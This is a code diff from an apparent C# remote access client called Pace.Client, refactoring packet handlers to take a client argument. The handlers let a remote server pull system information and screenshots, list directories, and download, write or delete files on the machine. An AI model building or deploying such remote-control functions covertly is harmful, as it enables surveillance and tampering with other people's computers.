@@ -1,8 +1,8 @@
 ﻿using Pace.Client.Configuration;
+using Pace.Client.Network;
 using Pace.Client.System;
 using Pace.Client.Web;
 using Pace.Common.Network;
-using Pace.Common.Network.Packets;
 using Pace.Common.Network.Packets.Client;
 using Pace.Common.Network.Packets.Server;
 using System;
@@ -44,7 +44,7 @@ namespace Pace.Client
 
             var packetChannel = new PacketChannel();
 
-            packetChannel.RegisterHandler<GetSystemInfoRequestPacket>((packet) =>
+            packetChannel.RegisterHandler<GetSystemInfoRequestPacket>((client, packet) =>
             {
                 var systemInfo = SystemInformation.Get();
                 var addressInfo = client.Address.Split(':');
@@ -61,13 +61,13 @@ namespace Pace.Client
                 client.SendPacket(infoPacket);
             });
 
-            packetChannel.RegisterHandler<DownloadFileRequestPacket>((packet) =>
+            packetChannel.RegisterHandler<DownloadFileRequestPacket>((client, packet) =>
             {
                 var downloadFilePacket = (DownloadFileRequestPacket)packet;
                 new WebFileDownloader().DownloadFile(downloadFilePacket.Url);
             });
 
-            packetChannel.RegisterHandler<TakeScreenshotRequestPacket>((packet) =>
+            packetChannel.RegisterHandler<TakeScreenshotRequestPacket>((client, packet) =>
             {
                 var screenshot = ScreenCapture.CaptureScreen();
 
@@ -78,13 +78,13 @@ namespace Pace.Client
                 client.SendPacket(screenshotResponsePacket);
             });
 
-            packetChannel.RegisterHandler<SendFileRequestPacket>((packet) =>
+            packetChannel.RegisterHandler<SendFileRequestPacket>((client, packet) =>
             {
                 var sendFilePacket = (SendFileRequestPacket)packet;
                 File.WriteAllBytes(Path.Combine(Environment.CurrentDirectory, sendFilePacket.Filename), sendFilePacket.FileData);
             });
 
-            packetChannel.RegisterHandler<GetDirectoryRequestPacket>((packet) =>
+            packetChannel.RegisterHandler<GetDirectoryRequestPacket>((client, packet) =>
             {
                 var getDirectoryPacket = (GetDirectoryRequestPacket)packet;
 
@@ -111,7 +111,7 @@ namespace Pace.Client
                 client.SendPacket(response);
             });
 
-            packetChannel.RegisterHandler<DeleteFileRequestPacket>((packet) =>
+            packetChannel.RegisterHandler<DeleteFileRequestPacket>((client, packet) =>
             {
                 var deleteFilePacket = (DeleteFileRequestPacket)packet;
 
@@ -145,7 +145,7 @@ namespace Pace.Client
                 {
                     var packet = client.ReadPacket();
 
-                    packetChannel.HandlePacket(packet);
+                    packetChannel.HandlePacket(client, packet);
                 }
                 catch (IOException ex)
                 {
